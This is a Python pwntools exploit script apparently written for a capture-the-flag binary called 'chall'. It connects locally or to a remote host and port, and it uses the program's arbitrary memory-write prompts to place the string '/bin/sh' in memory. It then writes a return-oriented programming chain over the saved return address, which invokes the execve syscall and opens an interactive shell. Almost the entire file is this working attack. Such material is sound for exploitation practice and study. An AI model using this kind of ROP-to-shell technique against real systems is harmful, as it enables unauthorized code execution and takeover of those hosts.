from pwn import *

exe = context.binary = ELF("./chall")

# context.log_level = 'error'

gdbscript = '''
b *0x485441
c
'''
# b *0x484FDA

pre_argv = []
post_argv = []


def get_conn(pre_argv, post_argv, gdbscript):
    host = args.HOST or 'localhost'
    port = int(args.PORT or 1337)
    cmd = pre_argv + [exe.path] + post_argv
    context.terminal = 'st'

    if args.REMOTE:
        p = remote(host, port)
    else:
        p = process(cmd)

    if args.GDB:
        gdb.attach(p)

    if args.DBG:
        p = gdb.debug(cmd, gdbscript=gdbscript)

    return p


def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__} {args} {kwargs}")
        return func(*args, **kwargs)
    return wrapper


p : tube = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: p.recv(*a, **k)
rl = lambda *a, **k: p.recvline(*a, **k)
ru = lambda *a, **k: p.recvuntil(*a, **k)
rr = lambda *a, **k: p.recvregex(*a, **k)
cl = lambda *a, **k: p.clean(*a, **k)
s = lambda *a, **k: p.send(*a, **k)
sa = lambda *a, **k: p.sendafter(*a, **k)
st = lambda *a, **k: p.sendthen(*a, **k)
sl = lambda *a, **k: p.sendline(*a, **k)
sla = lambda *a, **k: p.sendlineafter(*a, **k)
slt = lambda *a, **k: p.sendlinethen(*a, **k)
ia = lambda *a, **k: p.interactive(*a, **k)

ptr_protect = lambda pos, ptr: ptr ^ (pos >> 12)
ptr_mangle = lambda ptr, grd: rol(ptr ^ grd, 0x11)
ptr_demangle = lambda ptr, grd: ror(ptr, 0x11) ^ grd
i2b = lambda i: str(i).encode()
h2b = lambda i: hex(i).encode()


i_ptr = int(input("> "), 16) if args.DBG else 0xc00009cdb8
ret_addr = i_ptr + 0x190

pop_rdi = 0x46b3e6
pop_rax = 0x4224c4
mov_rsi_rax = 0x41338f
# 0x000000000047bd2e : pop rdx ; sbb byte ptr [rax + 0x29], cl ; ret
pop_rdx = 0x47bd2e
syscall = 0x40336c
binsh = 0x598f00

payload = flat(
    pop_rdi, binsh,
    pop_rax, 0,
    mov_rsi_rax,
    pop_rax, binsh,
    pop_rdx, 0,
    pop_rax, 0x3b,
    syscall
)

sla(b"r/w): ", b"w")
sla(b"): ", h2b(i_ptr))
sla(b"): ", h2b(len(payload) + 9))

for i, b in enumerate(b"/bin/sh\x00"):
    sla(b"r/w): ", b"w")
    sla(b"): ", h2b(binsh + i))
    sla(b"): ", h2b(b))

for i, b in enumerate(payload):
    print(f"{i}. written")
    sla(b"r/w): ", b"w")
    sla(b"): ", h2b(ret_addr + i))
    sla(b"): ", h2b(b))

ia()